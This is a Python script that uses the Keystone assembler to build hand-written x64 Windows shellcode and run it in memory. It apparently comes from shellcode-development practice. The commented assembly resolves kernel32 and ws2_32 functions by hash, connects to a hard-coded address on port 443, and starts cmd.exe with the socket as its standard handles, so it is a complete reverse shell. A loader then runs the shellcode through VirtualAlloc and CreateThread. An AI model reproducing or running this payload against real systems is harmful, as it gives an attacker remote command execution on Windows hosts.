import ctypes, struct
import binascii
import os
import subprocess
from keystone import *

def main():
    SHELLCODE = (
        " start:                            "
        "   int3                            ;"
        "   mov rbp, rsp                    ;"
        "   add rsp, 0xffffffffffffffe0     ;"  # Allocate stack
        
        " find_kernel32:                    "   # start to find kernel32 library
        "   xor rcx, rcx                    ;"  # Zero RCX contents
        "   mov rsi, gs:[rcx+0x60]          ;"  # 0x060 load PEB to RAX
        "   mov rsi, [rsi+0x18]             ;"  # 0x18 load PEB.Ldr Offset
        "   mov rsi, [rsi+0x20]             ;"  # 0x20 Offset = PEB.Ldr.InMemoryOrderModuleList
        
        " next_module:                      "
        "   mov rbx, [rsi+0x20]             ;"  # DllBase, InMem + 0x30 - 0x10
        "   mov rdi, [rsi+0x50]             ;"  # ModName, InMem + 0x58 - 0x10 + 0x8 (Buffer)
        "   mov rsi, [rsi]                  ;"  # RSI = InMem.Flink (next module)
        "   cmp [rdi+0xc*2], cx             ;"  # KERNEL32.DLL is 12 bytes long, if 25th position of UNICODE is NULL, bingo
        "   jne next_module                 ;"  # If not, keep looking
        
        " get_find_function_ret:            "
        "   jmp find_function_short         ;"  # A short jump to call function backwards
        
        " find_function_ret:                 "
        "   pop rsi                         ;"  # Pop ret addr of find_function to RSI
        "   mov [rbp+0x8], rsi              ;"  # Save ret addr of find_function to [rbp+0x8] for later use
        "   jmp resolve_functions_knl32     ;"  # Resolve functions
        
        " find_function_short:               "
        "   call find_function_ret          ;"  # This will push the ret addr of find_function on stack, we will save that for later use
               
        # Resolving VA for Export Address Table
        " find_function:                    "
        "   mov eax, dword ptr [rbx+0x3C]   ;"  # dll->e_lfanew
        "   mov edi, dword ptr [rbx+rax+0x88];"  # RDI = Export Directory RVA (0x78 + 0x10) NULL Byte
        "   add rdi, rbx                    ;"  # RDI = Export Directory VA
        "   xor rcx, rcx                    ;"  # Clear RCX TODO: no need?
        "   mov ecx, dword ptr [rdi+0x18]   ;"  # RCX = NumberOfNames
        "   xor rax, rax                    ;"  # Clear RAX TODO: no need?
        "   mov eax, dword ptr [rdi+0x20]   ;"  # RAX = AddressOfNames RVA
        "   add rax, rbx                    ;"  # RAX = AddressOfNames VA
        "   mov [rbp+0x10], rax             ;"  # Save AddressOfNames VA to [rbp+0x10]
        
        # Resolve specific function from Kerner32.dll
        " find_function_loop:               "
        "   jecxz function_found            ;"  # RCX = 0, loop over
        "   dec rcx                         ;"  # Decrese RCX counter
        "   mov rax, [rbp+0x10]             ;"  # Restore AddressOfNames VA
        "   mov esi, dword ptr [rax+rcx*4]  ;"  # ESI = RVA of function name
        "   add rsi, rbx                    ;"  # RSI = VA of function name
        
        " compute_hash:                     "
        "   xor rax, rax                    ;"  # Clear RAX
        "   cqo                             ;"  # Clear RDX
        "   cld                             ;"  # Clear direction
        
        " compute_hash_again:               "
        "   lodsb                           ;"  # Load byte at RSI into AL
        "   test al, al                     ;"  # Check for NULL terminator
        "   jz compute_hash_done            ;"  # Finish hashing when ZF is set
        "   ror edx, 0x0d                   ;"  # Rotate RDX 13 bits to the right
        "   add edx, eax                    ;"  # Add new bytes to RDX
        "   jmp compute_hash_again         ;"  # Compute hash for next byte
        
        " compute_hash_done:                "
        
        " find_function_compare:            "
        "   cmp edx, r15d                   ;"  # Compare computed hash with target hash
        "   jnz find_function_loop          ;"  # If not match, loop to next
        "   mov edx, dword ptr [rdi+0x24]   ;"  # EDX = AddressOfNameOrdinals RVA
        "   add rdx, rbx                    ;"  # RDX = AddressOfNameOrdinals VA
        "   mov cx, word ptr [rdx+rcx*2]    ;"  # ECX = Function's Ordinal
        "   mov edx, dword ptr [rdi+0x1c]   ;"  # EDX = AddressOfFunctions RVA
        "   add rdx, rbx                    ;"  # RDX = AddressOfFunctions VA
        "   mov eax, dword ptr [rdx+rcx*4]  ;"  # EAX = Function RVA
        "   add rax, rbx                    ;"  # RAX = Function VA; Save Function VA to RAX

        " function_found:                   "
        "   ret                             ;"
        
        " resolve_functions_knl32:              "
        "   mov r15, 0x78b5b983             ;"  # TerminateProcess hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x18], rax             ;"  # Save TerminateProcess to [rbp+0x18]
        "   mov r15, 0xec0e4e8e             ;"  # LoadLibraryA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x20], rax             ;"  # Save LoadLibraryA to [rbp+0x20]
        "   mov r15, 0x16b3fe72             ;"  # CreateProcessA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x28], rax             ;"  # Save CreateProcessA to [rbp+0x28]
        
        " dummy_1:                          "  # stage 1 and 2 separator 0x90 * 10
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        
        # Stage 2 begin
        " load_ws2_32:                      "
        "   xor rax, rax                    ;"  # Clear RAX for ws2_32.dll\0 string
        "   mov ax, 0x6c6c                  ;"  # RAX = \0ll
        "   push rax                        ;"  # Stack = \0ll
        "   mov rax, 0x642e32335f327377     ;"  # RAX = d.23_2sw
        "   push rax                        ;"  # Stack = \0lld.23_2sw
        "   mov rcx, rsp                    ;"  # Argument pointer to LoadLibraryA
        "   add rsp, 0xffffffffffffffa0     ;"  # Stack space & home space
        "   call qword ptr [rbp+0x20]       ;"  # Call LoadLibraryA
        "   add rsp, 0x60                   ;"  # Cleanup
        "   mov rbx, rax                    ;"  # Save base address of ws2_32.dll to RBX
        
        " resolve_functions_ws2_32:         "
        "   mov r15, 0x3bfcedcb             ;"  # WSAStartup hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x30], rax             ;"  # Save WSAStartup to [rbp+0x30]
        "   mov r15, 0xadf509d9             ;"  # WSASocketA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x38], rax             ;"  # Save WSASocketA to [rbp+0x38]
        "   mov r15, 0xb32dba0c             ;"  # WSAConnect hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x40], rax             ;"  # Save WSAConnect to [rbp+0x40]
        
        " dummy_2:                          "  # stage 2 and 3 separator 0x90 * 10
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        
        " call_wsastartup:                  "
        "   add rsp, 0xfffffffffffffdf8     ;"  # Allocate stack space, for lpWSAData structure, second argument (note the 8 is for stack alignment because lpWSAData is only 8 bytes)
        "   mov cx, 0x202                   ;"  # First argument, wVersionRequired
        "   mov rdx, rsp                    ;"  # Move ESP to RDX, space for lpWSAData
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x30]       ;"  # Call WSAStartup
        "   add rsp, 0x228                   ;"  # Cleanup
        "   test al, al                     ;"  # Check return
        "   jnz call_terminate_process      ;"  # If not zero, terminate process
             
        " call_wsasocketa:                  "
        "   add rsp, 0xfffffffffffffdf8     ;"  # Allocate stack space
        "   xor rcx, rcx                    ;"  # Clear RCX
        "   xor rdx, rdx                    ;"  # Clear RDX
        "   mov cl, 0x2                     ;"  # First arg, af, 0x2
        "   mov dl, 0x1                     ;"  # Second arg, type, 0x1
        "   mov r8, 0x6                     ;"  # Third arg, protocol, IPPROTO_TCP 0x6
        "   xor r9, r9                      ;"  # Fourth arg, lpProtocolInfo, 0x0
        "   push r9                         ;"  # Sixth arg, dwFlags, 0x0
        "   push r9                         ;"  # Fifth arg, g, 0x0
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x38]       ;"  # Call WSASocketA
        "   add rsp, 0x228                  ;"  # Cleanup
        "   cmp ax, 0xffff                  ;"  # Check return
        "   je call_terminate_process       ;"
        "   mov r15, rax                    ;"  # Save socket handle to R15
        
        " call_wsaconnect:                  "
        "   add rsp, 0xffffffffffffff00     ;"  # Allocate stack space for sockaddr_in struct
        "   mov rcx, r15                    ;"  # First arg, s
        "   xor rax, rax                    ;"  # Clear RAX, contruct sockaddr_in struct
        "   mov rax, 0x8a03a8c0bb010002     ;"  # sin_addr (4 bytes), sin_port (443 2 bytes), sin_family (AF_INET 2 bytes)
        "   push rax                        ;"  # Push sin_addr, sin_port & sin_family
        "   push rsp                        ;"  # Push pointer to structaddr_in struct
        "   pop rdx                         ;"  # Second arg, name
        "   mov r8, 0x10                    ;"  # Third arg, namelen (4 + 2 + 2 + char sin_zero[8])
        "   xor r9, r9                      ;"  # Fourth argc, lpCallerData
        "   push r9                         ;"  # Seventh arg, lpGQOS
        "   push r9                         ;"  # Sixth arg, lpGQOS
        "   push r9                         ;"  # Fifth arg, lpCalleeData
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x40]       ;"  # Call WSAConnect
        "   add rsp, 0x120                  ;"  # Cleanup
        "   test al, al                     ;"  # Check return
        "   jnz call_terminate_process      ;"  # If not zero, terminate process

        " create_startupinfoa:              "
        "   push r15                        ;"  # Push hStdError, (8 bytes), socket handle
        "   push r15                        ;"  # Push hStdOutput, (8 bytes), socket handle
        "   push r15                        ;"  # Push hStdInput, (8 bytes), socket handle
        "   xor rax, rax                    ;"  # Clear RAX
        "   push rax                        ;"  # Push lpReserved2, (8 bytes), 0x0
        "   push ax                         ;"  # Push cbReserved2 (2 bytes), 0x0
        "   push rax                        ;"  # Push wShowWindow (2 bytes), 0x0, compensate for dwFlags size and for stack alignment
        "   mov ax, 0x100                   ;"  # dwFlags
        "   push ax                         ;"  # Push dwFlags, 0x100 (4 bytes), 0x100
        "   xor rax, rax                    ;"  # Clear RAX
        "   push ax                         ;"  # Push dwFillAttribute (4 bytes), 0x0
        "   push ax                         ;"  # Push dwYCountChars (4 bytes), 0x0
        "   push rax                        ;"  # Push dwXCountChars (4 bytes), 0x0
        "   push rax                        ;"  # Push dwYSize (4 bytes), 0x0
        "   push rax                        ;"  # Push dwXSize (4 bytes), 0x0
        "   push rax                        ;"  # Push dwY (4 bytes), 0x0
        "   push rax                        ;"  # Push dwX (4 bytes), 0x0
        "   push rax                        ;"  # Push lpTitle (8 bytes), lpDesktop (8 bytes), lpReserved (8 bytes), 0x0, these pushes make exactly 52 bytes
        "   mov al, 0x68                    ;"  # cb size, (4 bytes), 0x68
        "   push rax                        ;"  # Push cb
        "   push rsp                        ;"  # Push pointer to StartupInfoA struct
        "   pop rsi                         ;"  # Save StartupInfoA addr to rsi

        " create_cmd_string:                "
        "   mov rax, 0x6578652e646d63       ;"  # RAX = cmd.exe
        "   push rax                        ;"  # Push cmd.exe
        "   push rsp                        ;"  # Push pointer to cmd.exe string
        "   pop rdx                         ;"  # Second arg, lpApplicationName
        
        " call_createprocessa:              "
        "   add rsp, 0xfffffffffffffdf8     ;"  # Allocate stack space
        "   xor rcx, rcx                    ;"  # First arg, lpApplicationName, 0x0
        "   xor r8, r8                      ;"  # Third arg, lpProcessAttributes, 0x0
        "   xor r9, r9                      ;"  # Fourth arg, lpThreadAttributes, 0x0
        "   push rsp                        ;"  # Tenth arg, lpProcessInformation addr
        "   push rsi                        ;"  # Ninth arg, lpStartupInfo
        "   push rcx                        ;"  # Eighth arg, lpCurrentDirectory, 0x0
        "   push rcx                        ;"  # Seventh arg, lpEnvironment, 0x0
        "   push rcx                        ;"  # Sixth arg, dwCreationFlags, 0x0
        "   xor rax, rax                    ;"  # Clear RAX
        "   inc rax                         ;"  # Increase to 0x1
        "   push rax                        ;"  # Fifth arg, bInheritHandles, 0x1
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x28]       ;"  # Call CreateProcessA
        "   add rsp, 0x228                  ;"  # Cleanup
        
        " call_terminate_process:            "
        "   mov rcx, 0xffffffffffffffff     ;"  # -1, Current process
        "   xor rdx, rdx                    ;"  # NULL
        "   call qword ptr [rbp+0x18]       ;"  # Call TerminateProcess
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: "  + output )
    print("Bytes: " + str(len(sh)))
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
